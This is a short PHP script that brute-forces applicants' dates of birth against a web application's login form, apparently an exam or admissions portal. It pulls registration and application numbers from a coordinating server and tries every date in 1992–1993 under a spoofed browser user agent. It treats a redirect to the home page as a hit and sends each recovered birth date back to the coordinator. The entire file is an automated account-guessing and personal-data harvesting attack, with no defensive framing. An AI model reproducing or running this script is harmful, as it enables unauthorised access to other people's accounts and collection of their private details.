<?php
/** Initial form for birthdays
 * 
 * v2
 * Uses csv file of selections
 * @author : Abhay Rana
 * Update: Now checks the last redirect url for correctness rather than just the status code
 * Now uses scheduling
 * Renamed to birthday_task.php
 */
//Global Vars
$server = "http://192.168.208.235/iit/";
error_reporting(E_ALL);
ini_set("display_errors",1);
set_time_limit(0);
include "Snoopy.class.php";
$snoopy=new snoopy;
$snoopy->agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
$complete = false;//This is for when the job does get over!!!
while(!$complete)://While the task is not complete
	//Initialization stuff	
	$response = file_get_contents($server);
	echo $response."\n";
	if($response == 'complete') $complete = true;
	$url = "http://192.168.216.1/viewapp/index.php";
	$found = false;
	for($y=1992;$y<=1993;$y++){
		for($m=1;$m<=12;$m++){
			for($d=1;$d<=31;$d++){
				$form = array(		
					'day'	=>str_pad($d,2,'0',STR_PAD_LEFT),
					'month'	=>str_pad($m,2,'0',STR_PAD_LEFT),
					'year'	=>$y,
					'proceed'=>'Proceed',
					'appln_no'=>$response[1],
					'regn_no' =>$response[0]
				);
				$date = $form['day']."/".$form['month']."/".$form['year'];
				echo $date."\r";
				if(check($form)){
					echo "\n************$date\n";
					respond($form['regn_no'],$date);
					$found=true;
					break 3;
				}
			}
		}
	}
	echo "\nHERE\n";
	if(!$found)//There was no result, we need to search more years later, mark it as such
		respond($form['regn_no'],'-');
endwhile;
function check($form){
	global $snoopy,$url;
	$snoopy->submit($url,$form);
	if(strpos($snoopy->lastredirectaddr,'home.php')!==false)
		return true;
	else
		return false;
}
function respond($reg,$date){
	global $server;
	echo "\nRESPONDING $reg - $date \n";
	file_get_contents($server."submit.php?reg=$reg&date=$date");
}
